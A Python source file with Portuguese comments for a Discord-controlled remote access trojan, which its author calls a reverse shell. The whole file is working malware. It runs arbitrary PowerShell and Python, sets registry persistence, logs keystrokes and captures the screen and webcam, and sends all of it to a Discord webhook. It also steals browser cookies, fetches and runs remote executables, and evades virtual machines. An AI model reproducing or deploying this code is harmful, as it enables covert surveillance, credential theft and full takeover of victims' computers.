import subprocess
import requests
import json
import threading
import os
import platform
import base64
import logging
import pyscreenshot as ImageGrab
import cv2
import psutil
import time
import tempfile
import keyboard
import datetime
import discord
import shutil
import sys
import browser_cookie3
import mss  # For screen recording

# Configuração de Discord
DISCORD_BOT_TOKEN = " TOKEN DO BOT DO DISCORD "
CHANNEL_ID = ID DO CANAL 
WEBHOOK_URL = " URL DO WEBHOOK "

# Configuração de registro em log
logging.basicConfig(filename='reverse_shell.log', level=logging.INFO, format='%(asctime)s %(message)s')

# Função para enviar mensagens para o webhook do Discord
def send_to_discord(message):
    try:
        payload = {"content": message}
        headers = {"Content-Type": "application/json"}
        response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logging.error(f"Erro ao enviar mensagem para Discord: {e}")

# Função para enviar arquivos para Discord
def send_file_to_discord(file_path, message=""):
    try:
        with open(file_path, "rb") as f:
            payload = {
                "content": message,
                "file": (file_path, f)
            }
            response = requests.post(WEBHOOK_URL, files=payload)
            response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logging.error(f"Erro ao enviar arquivo para Discord: {e}")

# Função para localizar o PowerShell
def get_powershell_path():
    possible_paths = [
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    ]
    for path in possible_paths:
        if os.path.exists(path):
            return path
    return "powershell"

# Função para executar comandos do sistema via PowerShell
def execute_command(command):
    powershell_path = get_powershell_path()
    try:
        result = subprocess.check_output([powershell_path, "-Command", command], stderr=subprocess.STDOUT, timeout=10, encoding='utf-8', errors='ignore')
        return result
    except subprocess.TimeoutExpired:
        return "Erro: Comando expirou por timeout."
    except subprocess.CalledProcessError as e:
        return str(e.output)
    except FileNotFoundError:
        return "Erro: PowerShell não encontrado."
    except Exception as e:
        return f"Erro desconhecido: {e}"

# Função para obter informações do sistema
def system_info():
    try:
        info = f"OS: {platform.system()} {platform.release()}\n"
        info += f"Node: {platform.node()}\n"
        info += f"Processor: {platform.processor()}\n"
        return info
    except Exception as e:
        logging.error(f"Erro ao obter informações do sistema: {e}")
        return f"Erro ao obter informações do sistema: {e}"

# Função para configurar persistência
def set_persistence():
    try:
        persistence_path = os.path.join(tempfile.gettempdir(), 'reverse_shell.exe')
        if not os.path.exists(persistence_path):
            shutil.copy(sys.executable, persistence_path)
            subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ReverseShell /t REG_SZ /d "{persistence_path}"', shell=True)
            send_to_discord("Persistência configurada com sucesso.")
        else:
            send_to_discord("Persistência já está configurada.")
    except Exception as e:
        logging.error(f"Erro ao configurar persistência: {e}")
        send_to_discord(f"Erro ao configurar persistência: {e}")

# Função para capturar screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        send_file_to_discord("screenshot.png", "Screenshot capturada")
        os.remove("screenshot.png")
    except Exception as e:
        logging.error(f"Erro ao capturar screenshot: {e}")
        return f"Erro ao capturar screenshot: {e}"

# Função para capturar imagem da webcam
def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if not ret:
            return "Erro ao acessar a webcam."
        cv2.imwrite("webcam.jpg", frame)
        cam.release()
        send_file_to_discord("webcam.jpg", "Imagem da webcam capturada")
        os.remove("webcam.jpg")
    except Exception as e:
        logging.error(f"Erro ao capturar imagem da webcam: {e}")
        return f"Erro ao capturar imagem da webcam: {e}"

# Função para monitorar processos em execução
def monitor_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(f"{proc.info['pid']}: {proc.info['name']} (User: {proc.info['username']})")
        return "\n".join(processes)
    except Exception as e:
        logging.error(f"Erro ao monitorar processos: {e}")
        return f"Erro ao monitorar processos: {e}"

# Função para fazer upload de arquivos
def upload_file(file_path):
    try:
        with open(file_path, "rb") as f:
            encoded_string = base64.b64encode(f.read()).decode()
        return encoded_string
    except Exception as e:
        logging.error(f"Erro ao fazer upload do arquivo: {e}")
        return f"Erro ao fazer upload do arquivo: {e}"

# Função para baixar arquivos
def download_file(file_path, file_data):
    try:
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(file_data))
        return "Arquivo baixado com sucesso."
    except Exception as e:
        logging.error(f"Erro ao fazer download do arquivo: {e}")
        return f"Erro ao fazer download do arquivo: {e}"

# Função para iniciar keylogger
def start_keylogger():
    def on_keyboard_event(event):
        try:
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{now}] Key: {event.name}"
            send_to_discord(log_entry)
        except Exception as e:
            logging.error(f"Erro no keylogger: {e}")
        return True

    keyboard.hook(on_keyboard_event)
    keyboard.wait()

# Função para salvar keylog
def save_keylog():
    keylog_path = os.path.join(tempfile.gettempdir(), 'keylog.txt')
    with open(keylog_path, "a") as f:
        def on_keyboard_event(event):
            try:
                now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{now}] Key: {event.name}\n"
                f.write(log_entry)
            except Exception as e:
                logging.error(f"Erro no keylogger: {e}")
        keyboard.hook(on_keyboard_event)
        keyboard.wait()

# Função para enviar keylog para Discord
def send_keylog():
    keylog_path = os.path.join(tempfile.gettempdir(), 'keylog.txt')
    if os.path.exists(keylog_path):
        send_file_to_discord(keylog_path, "Log do Keylogger")

# Função para atualização automática
def auto_update(new_version_url):
    try:
        response = requests.get(new_version_url)
        with open("update.exe", "wb") as f:
            f.write(response.content)
        subprocess.run("update.exe", shell=True)
        return "Atualização iniciada com sucesso."
    except Exception as e:
        logging.error(f"Erro ao iniciar atualização: {e}")
        return f"Erro ao iniciar atualização: {e}"

# Função para enviar mensagens de Conexão
def keep_alive():
    while True:
        try:
            send_to_discord("Shell reverso ainda ativo.")
            time.sleep(600)  # Envia mensagem a cada 10 minutos
        except Exception as e:
            logging.error(f"Erro no keep-alive: {e}")

# Função para executar scripts Python
def execute_script(script_code):
    try:
        exec(script_code, globals())
        return "Script executado com sucesso."
    except SyntaxError as e:
        logging.error(f"Erro ao executar script: {e}")
        return f"Erro ao executar script: {e.text}\nLinha: {e.lineno}"
    except Exception as e:
        logging.error(f"Erro ao executar script: {e}")
        return f"Erro ao executar script: {e}"

# Função para injetar comando via PowerShell
def inject_command(command):
    try:
        result = execute_command(command)
        send_to_discord(f"Resultado do comando '{command}':\n{result}\n")
    except Exception as e:
        logging.error(f"Erro ao injetar comando: {e}")
        send_to_discord(f"Erro ao injetar comando: {e}")

# Função para exfiltrar dados do navegador
def exfiltrate_browser_data():
    try:
        cookies = browser_cookie3.load()
        data = []
        for cookie in cookies:
            data.append(f"{cookie.domain} - {cookie.name} - {cookie.value}")
        return "\n".join(data)
    except Exception as e:
        logging.error(f"Erro ao exfiltrar dados do navegador: {e}")
        return f"Erro ao exfiltrar dados do navegador: {e}"

# Função para escalar privilégios
def escalate_privileges():
    try:
        result = execute_command("Start-Process cmd -Verb RunAs")
        return f"Privilégios escalados: {result}"
    except Exception as e:
        logging.error(f"Erro ao escalar privilégios: {e}")
        return f"Erro ao escalar privilégios: {e}"

# Função para explorar a rede local
def explore_network():
    try:
        result = execute_command("Get-NetNeighbor")
        return f"Dispositivos na rede local: {result}"
    except Exception as e:
        logging.error(f"Erro ao explorar a rede local: {e}")
        return f"Erro ao explorar a rede local: {e}"

# Função para monitorar a tela em tempo real
def start_screen_monitoring():
    try:
        with mss.mss() as sct:
            while True:
                sct.shot(output="monitor.png")
                send_file_to_discord("monitor.png", "Captura de tela em tempo real")
                os.remove("monitor.png")
                time.sleep(1)
    except Exception as e:
        logging.error(f"Erro ao monitorar a tela: {e}")
        return f"Erro ao monitorar a tela: {e}"

# Função para detectar e evitar depuração e VMs
def anti_debugging():
    try:
        if os.path.exists("/.dockerenv") or "vbox" in platform.platform().lower() or "virtual" in platform.platform().lower():
            send_to_discord("Ambiente virtual ou de depuração detectado. Encerrando.")
            sys.exit()
    except Exception as e:
        logging.error(f"Erro ao detectar ambiente de depuração ou VM: {e}")

# Função para agendar tarefas
def schedule_task(command, time_str):
    try:
        schedule_time = datetime.datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
        delay = (schedule_time - datetime.datetime.now()).total_seconds()
        if delay > 0:
            threading.Timer(delay, inject_command, [command]).start()
            return "Tarefa agendada com sucesso."
        else:
            return "Erro: Tempo agendado já passou."
    except Exception as e:
        logging.error(f"Erro ao agendar tarefa: {e}")
        return f"Erro ao agendar tarefa: {e}"

# Banner do Script
def hacker_banner():
    banner = """ 
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠚⠉⠀⠀⠉⠑⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣠⠔⠋⠉⣩⣍⠉⠙⠢⣄⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢧⡜⢏⠓⠒⠚⠁⠈⠑⠒⠚⣹⢳⡸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠸⡄⠀⠀⠀⠀⠀⠀⢠⠇⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡴⠚⠉⢣⡙⢦⡀⠀⠀⢀⡰⢋⡜⠉⠓⠦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡴⠁⢀⣀⣀⣀⣙⣦⣉⣉⣋⣉⣴⣋⣀⣀⣀⡀⠈⢧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡸⠁⠀⢸⠀⠀⠀⠀⢀⣔⡛⠛⡲⡀⠀⠀⠀⠀⡇⠀⠈⢇⠀⠀⠀⠀
⠀⠀⠀⢠⠇⠀⠀⠸⡀⠀⠀⠀⠸⣼⠽⠯⢧⠇⠀⠀⠀⠀⡇⠀⠀⠘⡆⠀⠀⠀
⠀⠀⠀⣸⠀⠀⠀⠀⡇⠀⠀⠀⠳⢼⡦⢴⡯⠞⠀⠀⠀⢰⠀⠀⠀⠀⢧⠀⠀⠀
⠀⠀⠀⢻⠀⠀⠀⠀⡇⠀⠀⠀⢀⡤⠚⠛⢦⣀⠀⠀⠀⢸⠀⠀⠀⠀⡼⠀⠀⠀
⠀⠀⠀⠈⠳⠤⠤⣖⣓⣒⣒⣒⣓⣒⣒⣒⣒⣚⣒⣒⣒⣚⣲⠤⠤⠖⠁⠀⠀⠀
⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                     
    """
    print(banner)
    send_to_discord(banner)

# Função principal do shell reverso
def reverse_shell():
    hacker_banner()
    send_to_discord("Shell reverso conectado.")
    send_to_discord(f"Informações do sistema:\n{system_info()}\n")
    set_persistence()

    intents = discord.Intents.default()
    intents.messages = True
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        logging.info(f'Logged in as {client.user}')
        channel = client.get_channel(CHANNEL_ID)
        await channel.send('Shell reverso conectado e pronto para receber comandos.')

    @client.event
    async def on_message(message):
        if message.author == client.user:
            return

        if message.content.startswith("!"):
            command = message.content[1:].lower()
            if command in ["exit", "quit"]:
                await message.channel.send("Shell reverso desconectado.")
                await client.close()
            elif command == "screenshot":
                capture_screenshot()
            elif command == "webcam":
                capture_webcam()
            elif command == "monitor_processes":
                processes = monitor_processes()
                await message.channel.send(f"Processos em execução: \n{processes}\n")
            elif command.startswith("upload"):
                file_path = command.split(" ", 1)[1]
                file_data = upload_file(file_path)
                await message.channel.send(f"Arquivo {file_path} enviado: \n{file_data}\n")
            elif command.startswith("download"):
                _, file_path, file_data = command.split(" ", 2)
                result = download_file(file_path, file_data)
                await message.channel.send(result)
            elif command == "keylogger":
                keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
                keylogger_thread.start()
                await message.channel.send("Keylogger iniciado.")
            elif command == "save_keylog":
                save_keylog()
                await message.channel.send("Log do keylogger salvo.")
            elif command == "send_keylog":
                send_keylog()
                await message.channel.send("Log do keylogger enviado.")
            elif command.startswith("update"):
                new_version_url = command.split(" ", 1)[1]
                result = auto_update(new_version_url)
                await message.channel.send(result)
            elif command.startswith("exec"):
                script_code = message.content[6:]
                result = execute_script(script_code)
                await message.channel.send(result)
            elif command == "exfiltrate":
                data = exfiltrate_browser_data()
                await message.channel.send(f"Dados exfiltrados: \n{data}\n")
            elif command == "escalate":
                result = escalate_privileges()
                await message.channel.send(result)
            elif command == "explore":
                result = explore_network()
                await message.channel.send(f"Rede explorada: \n{result}\n")
            elif command == "monitor_screen":
                screen_monitor_thread = threading.Thread(target=start_screen_monitoring, daemon=True)
                screen_monitor_thread.start()
                await message.channel.send("Monitoramento de tela iniciado.")
            elif command.startswith("schedule"):
                _, cmd, time_str = command.split(" ", 2)
                result = schedule_task(cmd, time_str)
                await message.channel.send(result)
            else:
                inject_command(command)

    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()

    client.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    reverse_shell()
